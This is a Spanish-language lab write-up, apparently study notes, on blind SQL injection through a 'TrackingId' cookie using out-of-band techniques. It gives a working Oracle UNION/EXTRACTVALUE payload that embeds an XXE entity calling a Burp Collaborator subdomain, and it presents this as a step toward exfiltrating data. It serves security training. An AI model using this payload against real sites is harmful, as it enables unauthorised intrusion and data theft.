
La vulnerabilidad reside en la cookie ‘**TrackingId**‘, que es inyectada en una consulta SQL. Aprovechamos esta situación para insertar un payload que provoca una resolución DNS hacia un dominio controlado, utilizando la funcionalidad de Burp Collaborator.

Combinamos la inyección SQL con una entidad externa en XML (**XXE**) que genera una solicitud automática a un subdominio de Collaborator, confirmando así que la inyección fue ejecutada aunque no haya evidencia directa en la respuesta HTTP.

Esta clase introduce un enfoque más avanzado de explotación cuando no hay errores, retardos ni cambios visibles, y prepara el terreno para el siguiente paso: la exfiltración real de datos usando canales fuera de banda

------
#### Para hacer peticiones a dominios externos, podemos usar Requestsbin

Primero debemos de probar todas las posibilidades para sabes si es vulnerable a SQL, y en dado caso de no tener exito, realizamos el siguiente payload en el valor de la cookie TrackingId:

```xml
TrackingId=codncnov1' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -
```

**Recuerda Urlencodear los ; y los % para que no entre en conflicto con el formato de la peticion**







